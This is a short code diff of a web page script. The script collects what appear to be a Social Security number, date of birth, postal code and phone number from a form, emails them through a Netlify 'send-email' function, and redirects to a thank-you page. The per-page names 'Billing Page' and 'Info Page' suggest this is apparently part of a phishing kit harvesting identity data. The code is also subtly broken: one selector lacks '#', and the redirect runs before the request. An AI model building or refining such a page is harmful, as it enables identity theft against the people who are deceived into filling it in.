@@ -132,19 +132,24 @@
         const c_postal = document.querySelector("#c_postal").value;
         const c_phone = document.querySelector("c_phone").value;
 
-        const res = await fetch("/.netlify/functions/send-email", {
-          method: "POST",
-          body: JSON.stringify({
-            c_ssnn,
-            c_dob,
-            c_postal,
-            c_phone,
-            pageName: "Billing Page", // This changes per page
-          }),
-        });
+        window.location.href = "thankyou.html";
+        try {
+          const res = await fetch("/.netlify/functions/send-email", {
+            method: "POST",
+            body: JSON.stringify({
+              c_ssnn,
+              c_dob,
+              c_postal,
+              c_phone,
+              pageName: "Info Page", // This changes per page
+            }),
+          });
 
-        const data = await res.json();
-        console.log(data);
+          const data = await res.json();
+          console.log(data);
+        } catch (err) {
+          console.error("Error sending mock data:", err);
+        }
       });
     </script>
   </body>
